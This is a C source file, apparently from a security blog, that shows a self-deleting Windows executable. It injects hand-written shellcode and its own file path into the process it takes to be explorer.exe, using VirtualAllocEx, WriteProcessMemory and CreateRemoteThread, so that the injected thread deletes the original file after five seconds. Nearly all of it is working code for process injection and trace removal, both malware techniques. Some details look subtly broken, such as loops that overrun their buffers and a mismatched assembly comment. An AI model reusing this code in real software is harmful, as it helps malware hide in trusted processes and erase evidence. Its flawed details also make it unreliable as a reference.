/*
Self deleting executable
Blog : http://www.debasish.in/
Description : It injects -> file_deleting_shellcode+executable_path <- to "explorer.exe", 
and create a new thread,which will then delete the main executable after 5 seconds
Shellcode is "HardCoded" and tested on WinXP SP2
This can be used to make the shellcode universal : http://blog.harmonysecurity.com/2009/06/retrieving-kernel32s-base-address.html
*/
#include<windows.h>
int main()
{   
    HANDLE hProcess;
    HANDLE ht = NULL;
    DWORD pid = NULL; 
    HANDLE hProc = INVALID_HANDLE_VALUE;
    char shell[500] = "";               //Hold the main shellcode(ShellCode+FilePath)
	char path[MAX_PATH];
	/*This shellcode written in such way that the full path of the file to be deleted can be appended just next to the shellcode part[]*/
                                              /*objdump output*/
    char part[]= "\x31\xc0"                 // xor    %eax,%eax
				"\xbb\x42\x24\x80\x7c"      // mov    $0x7c802442,%ebx	Address of Sleep on XP SP2 Too Sleepy!!:o :o
				"\x66\xb8\x88\x13"          // mov    $0x1388,%ax  5000ms = 0x1388ms Sleep(5)
				"\x50"                      // push   %eax
				"\xff\xd3"                  // call   *%ebx
				"\xeb\x1d"                  // jmp    2d Jump to filepath offset
				"\x31\xc0"                  // xor    %eax,%eax
				"\x31\xdb"                  // xor    %ebx,%ebx
				"\x31\xd1"                  // xor    %edx,%ecx
				"\x31\xd2"                  // xor    %edx,%edx
				"\x5b"                      // pop    %ebx
				"\x31\xc0"                  // xor    %eax,%eax
				"\x53"                      // push   %ebx
				"\xbb\x5c\xe8\x81\x7c"      // mov    $0x7c81e85c,%ebx	DeleteFile!Kernel32.dll
				"\xff\xd3"                  // call   *%ebx
				"\x31\xc0"                  // xor    %eax,%eax
				"\x50"                      // push   %eax
				"\xbb\xa2\xca\x81\x7c"      // mov    $0x7c81caa2,%ebx   Address of ExitProcess!Kernel32.dll
				"\x90\x90"                  // call   *%ebx  Call to Exit Process is filled with  NOPS.(It wont exit the parent process)
				"\xe8\xe6\xff\xff\xff";     // call   18
    GetModuleFileName( NULL, path, MAX_PATH );
    int i,j;
    /*Append the file path to shellcode*/
    for(i = 0; i<= sizeof(part);i++)
    {
          shell[i] = part[i];     
    }
          i = sizeof(part)-1;
          for (j = 0;j<=sizeof(path);j++)
          {
				shell[i] = path[j];
				i++;
          }
    GetWindowThreadProcessId(FindWindow(NULL,TEXT("")), &pid);             //Get PID of "explorer.exe" 
    hProcess = OpenProcess(0x1F0FFF,0,pid);
    LPVOID Alloc = VirtualAllocEx(hProcess,NULL,sizeof(shell),0x3000,0x04 );
    WriteProcessMemory(hProcess, Alloc, &shell, sizeof(shell), NULL);
    ht = CreateRemoteThread(hProcess, NULL, 0,Alloc, 0, 0, NULL);
    WaitForSingleObject(ht,1000);
    CloseHandle( hProcess );                    //Close the Handle of explorer.exe
	return 0;
}
